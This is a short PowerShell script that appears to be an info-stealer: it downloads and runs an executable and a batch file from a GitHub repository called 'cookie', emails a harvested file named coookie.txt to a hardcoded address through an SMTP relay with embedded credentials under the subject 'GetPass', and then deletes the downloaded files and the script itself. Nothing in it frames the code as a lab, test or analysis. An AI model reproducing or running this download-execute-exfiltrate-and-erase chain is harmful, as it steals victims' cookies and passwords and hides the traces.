(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/demo.exe','D:\demo.exe');
(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/Command.txt','D:\Command.bat');
D:
.\demo.exe | Out-Null
$SMTPServer = 'smtp.mailtrap.io'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)

$SMTPInfo.EnableSsl = $true 

$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('b54ababa9a8f80', 'e8ce20fc336bbc');

$ReportEmail = New-Object System.Net.Mail.MailMessage

$ReportEmail.From = 'sami@wagor.tc.edu.tw'

$ReportEmail.To.Add('sami@wagor.tc.edu.tw')

$ReportEmail.Subject = 'GetPass'

$ReportEmail.Body = 'GetPass_text'  
$ReportEmail.Attachments.Add('D:\coookie.txt')


$SMTPInfo.Timeout = 1000000
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Attachments.Dispose()

remove-item 'D:\coookie.txt'
remove-item 'D:\Command.bat'
remove-item 'D:\demo.exe'
remove-item 'D:\ab.ps1' -Force

